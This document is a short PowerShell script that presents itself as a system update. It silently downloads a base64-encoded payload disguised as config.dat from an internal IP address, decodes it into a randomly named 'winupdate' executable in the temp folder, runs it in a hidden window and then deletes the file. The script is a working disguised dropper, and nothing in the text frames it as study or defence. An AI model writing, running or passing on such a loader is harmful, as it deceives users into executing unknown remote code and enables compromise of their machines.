$ErrorActionPreference = 'SilentlyContinue'

Write-Host "Downloading system update..." -ForegroundColor Cyan

$url = "http://192.168.74.147:8080/config.dat"
$temp = "$env:TEMP\winupdate$(Get-Random).exe"

try {
    $wc = New-Object System.Net.WebClient
    $encoded = $wc.DownloadData($url)
    
    Write-Host "Decoding package..." -ForegroundColor Cyan
    
    $decoded = [System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString($encoded))
    
    Write-Host "Installing..." -ForegroundColor Cyan
    
    [System.IO.File]::WriteAllBytes($temp, $decoded)
    
    Start-Process -FilePath $temp -WindowStyle Hidden
    
    Write-Host "Complete!" -ForegroundColor Green
    
    Start-Sleep -Seconds 3
    Remove-Item $temp -Force -ErrorAction SilentlyContinue
    
} catch {
    Write-Host "Failed: $($_.Exception.Message)" -ForegroundColor Red
}
